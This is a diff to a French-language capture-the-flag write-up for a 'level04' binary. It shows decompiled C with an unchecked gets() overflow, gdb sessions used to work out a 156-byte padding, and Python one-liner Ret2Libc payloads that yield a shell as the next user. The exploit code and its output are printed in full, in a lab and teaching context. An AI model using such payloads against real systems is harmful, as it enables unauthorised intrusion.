@@ -38,10 +38,10 @@ Sans succès, je décompile le binaire avec [Dogbolt](https://dogbolt.org/?id=d2
 ```c
 int main(int argc, const char **argv, const char **envp)
 {
-  int stat_loc; // [esp+1Ch] [ebp-9Ch] BYREF
-  char buffer[128]; // [esp+20h] [ebp-98h] BYREF
-  int ptrace_result; // [esp+A8h] [ebp-10h]
-  pid_t pid; // [esp+ACh] [ebp-Ch]
+  int stat_loc;
+  char buffer[128]; // <------------------------1 buffer declared being 128 bytes
+  int ptrace_result;
+  pid_t pid;
 
   pid = fork();
 
@@ -71,9 +71,9 @@ int main(int argc, const char **argv, const char **envp)
     prctl(1, 1);
     ptrace(PTRACE_TRACEME, 0, 0, 0);
     puts("Give me some shellcode, k");
-    gets(buffer);
+    gets(buffer); // <--------------------------2 write user input into buffer but no size check = overflow = Ret2Libc
   }
-  return 0;
+  return 0; // <--------------------------------3 Ret2Libc overwrites return address of main() to point to system("/bin/sh")
 }
 ```
 
@@ -145,32 +145,53 @@ Mapped address spaces:
 Comme au `level01`, je cherche le padding du payload en analysant `gdb` :
 
 ```h
+$ gdb ./level04 -q
+Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
 (gdb) disas main
 Dump of assembler code for function main:
-   0x080486c8 <+0>:     push   %ebp
-   0x080486c9 <+1>:     mov    %esp,%ebp
-   0x080486cb <+3>:     push   %edi
-   0x080486cc <+4>:     push   %ebx
-=> 0x080486cd <+5>:     and    $0xfffffff0,%esp
-   0x080486d0 <+8>:     sub    $0xb0,%esp
+....
+   0x08048819 <+337>:   nop
+   0x0804881a <+338>:   mov    $0x0,%eax
+   0x0804881f <+343>:   lea    -0x8(%ebp),%esp <--------- break here before stack cleanup
+   0x08048822 <+346>:   pop    %ebx
+   0x08048823 <+347>:   pop    %edi
+   0x08048824 <+348>:   pop    %ebp
+   0x08048825 <+349>:   ret
+End of assembler dump.
+
+(gdb) b *main+343
+Breakpoint 1 at 0x804881f
+
+(gdb) r
+Starting program: /home/users/level04/level04
+Give me some shellcode, k
+dab
+child is exiting...
+
+Breakpoint 1, 0x0804881f in main ()
+(gdb) info registers
+...
+esp            0xffffd660       0xffffd660
+ebp            0xffffd718       0xffffd718
+...
 ```
 
-Ici, je vois un alignement sur 16 bytes, comme précédamment, et que la stack se voit allouer `0xb0` bytes de mémoire, soit 176.
+Je peux soustraire `esp` d'`ebp` : `0xffffd718 - 0xffffd660 = 184` bytes, auquel je soustrais le début de `buffer` dans le stack :
 
-`Dogbolt`, ainsi que `(gdb) disas main` me donnent les deux l'information que le buffer commence à `esp+20` :
-
-```c
-  char buffer[128]; // [esp+20h]
+```h
+   0x080486db <+19>:    mov    %eax,0xac(%esp)
+   0x080486e2 <+26>:    lea    0x20(%esp),%ebx
+   0x080486e6 <+30>:    mov    $0x0,%eax
 ```
 
-Cela correspond à `0x20` bytes, soit 32. Je peux donc soustraire cela du total alloué et trouve 144.
+Soit `184 - (0x20 ou 32) = 144` bytes.
+
 Comme pour le `level01`, j'ajoute 8 bytes (4 pour écrire sur `ebp`, puis 4 pour écrire sur la `return address` de main).
 
 Cela me donne un total de 152 bytes de padding. J'essaye le même payload que dans le `level01` : 
 
 ```bash
-$ (python -c 'print("\x90"*152 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-
-1])'; cat) | ./level04
+$ (python -c 'print("\x90" * 152 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])'; cat) | ./level04
 Give me some shellcode, k
 child is exiting...
 whoami
@@ -180,8 +201,7 @@ $
 Mais c'est sans succès. Je tente d'aligner sur 16 bytes comme précédamment :
 
 ```bash
-$ (python -c 'print("\x90"*160 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-
-1])'; cat) | ./level04
+$ (python -c 'print("\x90" * 160 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])'; cat) | ./level04
 Give me some shellcode, k
 whoami
 
@@ -193,8 +213,7 @@ Sans succès également. En examinant l'ASM à nouveau, je me rend compte que co
 Je tente avec 152 + 4 bytes :
 
 ```bash
-$ (python -c 'print("\x90"*156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1
-] + "\xf7\xf8\x97\xec"[::-1])'; cat) | ./level04
+$ (python -c 'print("\x90" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])'; cat) | ./level04
 Give me some shellcode, k
 whoami
 level05
